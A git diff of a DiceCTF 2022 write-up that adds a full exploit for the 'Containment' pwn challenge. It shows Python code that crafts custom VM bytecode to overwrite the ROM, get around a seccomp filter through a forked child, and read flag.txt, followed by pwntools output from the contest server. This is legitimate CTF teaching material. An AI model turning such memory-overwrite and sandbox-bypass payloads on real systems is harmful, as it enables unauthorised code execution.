@@ -1,5 +1,9 @@
 # DiceCTF 2022: Breach Writeup by Reductor
 
+tl;dr:
+* Breach (re) script: [solve.py](solve.py)
+* Containment (pwn) script: [exploit.py](exploit.py)
+
 Unfortunately during the CTF I didn't manage to solve the challenge, however got very far and finished solving it the day after the challenge had closed.
 
 ## Examining the package
@@ -1876,8 +1880,234 @@ This gives us the flag `dice{st4ying_ins1de_vms_1s_0verr4ted}`
 
 ## Exploiting the flag input for remote code execution
 
-TODO: Solve this and do a write-up
+Script: [exploit.py](exploit.py)
 
-This is the contaminated pwn challenge which reuses this same binary, I have yet to do this (it's already taken long enough to write this write-up)
+This is the contaminated pwn challenge which reuses this same binary, as mentioned earlier the `read()` writes to the start of the ROM, so it's possible to overwrite the code for after it returns from the parent code, in order to simplify writing this exploit I made use of pwninit to get working outside of Docker.
 
-In order to exploit contaminated it should be possible to write exploit which will overwrite the buffer which the flag get's written to (the rom) and execute custom VM code from 0x28 until 0x60 overwriting the exit() call doing your own thing (likely need to trigger a second read for a proper payload)
+The `read()` only consumes `0x60` bytes, which is not really enough for us to fully exploit what we need, on top of this the location which it starts at is `0x28` so we have an option to jump around these address to try and have as much code as possible or fit it all in the `0x38` (`0x28-0x60`)
+
+The first thing we need to start writing this exploit is some helpers to make it easier for crafting our own VM code
+
+```py
+def mov_imm(r, imm):
+    return bytes((1 | (r << 4),)) + p64(imm)
+
+def mov_reg(r1, r2):
+    return bytes((2, r1 | (r2 << 4)))
+
+def add(r1, r2):
+    return bytes((3 | (0 << 4), r1 | (r2 << 4)))
+
+def sub(r1, r2):
+    return bytes((3 | (1 << 4), r1 | (r2 << 4)))
+    
+def mov_to_mem(r1, r2):
+    return bytes((4, r1 | (r2 << 4)))
+
+def mov_from_mem(r1, r2):
+    return bytes((5, r2 | (r1 << 4)))    
+
+def jump_imm(imm):
+    return bytes((7,)) + p64(imm)
+
+def print_reg(r):
+    return bytes((10, r))
+    
+def halt():
+    return bytes((0, ))
+    
+def call(in_payload, addr):
+    ret = len(in_payload)+9+2+9+2+9
+    payload = mov_imm(0, 8)
+    payload += sub(15, 0)
+    payload += mov_imm(0, ret)
+    payload += mov_to_mem(15, 0)
+    payload += jump_imm(addr)
+
+    assert len(payload) + len(in_payload) == ret
+    return payload
+
+def syscall(payload):
+    return call(payload, 0x2353)
+```
+
+Now let's form an initial payload to be sent, in order to keep this within the desired size instead of doing a normal call instruction and jump I make the jump instead of the return of `get_flag` and then on top of that to reduce the need for more `mov mem[dst], src` instructions which are `9` bytes I use that same value as the size which gets patched into the read from stdin into the ROM.
+
+```py
+def initial_payload():
+    # Patches stdin read size for the flag from:
+    # 0x1e82: 	mov r11, 0x60
+    # into
+    # 0x1e82: 	mov r11, 0x1e34
+
+    # Payload to get a larger buffer
+    # assuming r0 ix 0x8 -- it gets set to 0 from the pervious ret
+    payload = b'A' * 0x28
+
+    # Get the address of the rom
+    payload += mov_imm(14, 0x02020)
+    payload += mov_from_mem(14, 14)
+
+    # address where the size of the read is within the parent
+    payload += mov_imm(8, 0x1e83)   
+    payload += add(8, 14)
+
+    # Setup a fake stack frame to return into 0x8
+    payload += sub(15, 0)
+    payload += mov_to_mem(15, 0)
+
+    # Setup a second stack frame to return into get_flag (0x1e34)
+    # additionally use this as the same value to be store
+    payload += sub(15, 0)
+    payload += mov_imm(9, 0x1e34)
+    payload += mov_to_mem(15, 9)
+
+    # jump to write_ptr
+    payload += jump_imm(0x2417)
+    assert len(payload) < 0x60
+    return payload
+```
+
+Once this is setup we need to send it then send an empty line so that it attempts to exit the program for where this code runs, when it finally executes it will end up back in the `get_flag` loop, so won't actually exit, but this flag will now fetch `0x1e34` bytes
+
+```py
+io.sendlineafter(b'Flag', initial_payload())
+io.sendlineafter(b'Flag', b'')
+```
+
+Now that we have the ability to send a much bigger payload, you might remember the mention of seccomp earlier, the payload that it is setting up limits syscalls only to `read`, `write`, `exit` unfortunately we need to read `flag.txt` which isn't open so we need the ability to call `open`, thankfully the fork doesn't have these same restrictions.
+
+Additionally the child does not break out of it's loop, so we need to modify it's loop from `child_loop`/`0x40b` to run the code we want on the client, at the same time this same code is added to the client, so it's one big payload used for both the parent and the child which needs to:
+
+1. Get the flag on the child
+2. Send the flag from the child to the parent
+3. Receive the flag on the parent
+4. Send teh flag to stdout
+
+```py
+def full_payload():
+    # Starting at 8 bytes in because that's the return address
+    payload = b'A'*8
+    
+    ################
+    #### PARENT CODE
+    ################
+
+    ###
+    # read( child, &mem[0], 100 )
+    payload += mov_imm(8, 0) # SYS_read
+    
+    # fd = child pipe
+    payload += mov_imm(0, 0x2018)
+    payload += mov_from_mem(9, 0)
+    
+    # buffer = &mem[0x0000]
+    payload += mov_imm(10, 0x4060) # &mem[0x0000]
+    payload += add(10, 3) # + exe base
+    
+    # count
+    payload += mov_imm(11, 100)
+
+    payload += syscall(payload)
+
+    ##
+    # puts( &mem[0] )
+    payload += mov_imm(8, 1) # SYS_write
+    payload += mov_imm(9, 1) # stdout
+    
+    # buffer = &mem[0x0000]
+    payload += mov_imm(10, 0x4060) # &mem[0x0000]
+    payload += add(10, 3) # + exe base
+
+    # count
+    payload += mov_imm(11, 100)
+    
+    payload += syscall(payload)
+    
+    payload += halt()
+    
+    ################
+    #### CHILD CODE
+    ################
+
+    child_start = len(payload)
+    
+    ###
+    # open('flag.txt', 0, 0 )
+     
+    # store 'flag.txt\x00' in mem[0]
+    payload += mov_imm(0, u64(b'flag.txt'))
+    payload += mov_imm(1, 100)
+    payload += mov_to_mem(1, 0)
+    payload += mov_imm(0, 100)
+    payload += mov_imm(1, 8)
+    payload += mov_to_mem(1, 0)
+    
+    payload += mov_imm(8, 2) # SYS_open
+    
+    # filename = &mem[0]
+    payload += mov_imm(9, 0x4060+100) # &mem[0x0000]
+    payload += add(9, 3) # + exe base
+    
+    payload += mov_imm(10, 0) # flags
+    payload += mov_imm(10, 0) # mode
+    
+    payload += syscall(payload)
+    
+    
+    ###
+    # sendfile( child, flag_file, 0, 100 )
+    payload += mov_reg(10, 8) # in_fd
+
+    payload += mov_imm(8, 40) # SYS_sendfile
+    
+    # out_fd = pipe
+    payload += mov_imm(0, 0x2010)
+    payload += mov_from_mem(9, 0)
+    
+    payload += mov_imm(11, 0)   # offset
+    payload += mov_imm(12, 100) # size
+    
+    payload += syscall(payload)
+    
+    payload += halt()
+    
+    assert len(payload) < 0x40b
+    
+    payload += b'B' * (0x40b - len(payload))
+
+    assert len(payload) == 0x40b # child_loop
+    
+    # Jump to the start of the child code, we do this instead of putting all the child payload here
+    # and it potentially getting too long that it ends up in two read()'s from stdin
+    payload += jump_imm(child_start)
+    
+    return payload
+```
+
+Finally we send this payload and wait for the flag to magically appear
+
+```py
+io.sendlineafter(b'Flag', full_payload())
+io.sendlineafter(b'Flag', b'')
+print(io.recvall())
+io.wait()
+```
+
+And the we get the final output
+```py
+[*] '/home/kali/Downloads/breach/breach_patched'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    RUNPATH:  b'.'
+[+] Opening connection to mc.ax on port 31618: Done
+payload length 1044
+[+] Receiving all data: Done (102B)
+[*] Closed connection to mc.ax port 31618
+b': dice{th4nk_y0u_for_expl0it1ng_my_3xpl0it_:)}\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+```
+
+It includes all the extra 0's because we read and write 100 bytes, even though it's not that long, but the final flag for this is `dice{th4nk_y0u_for_expl0it1ng_my_3xpl0it_:)}`
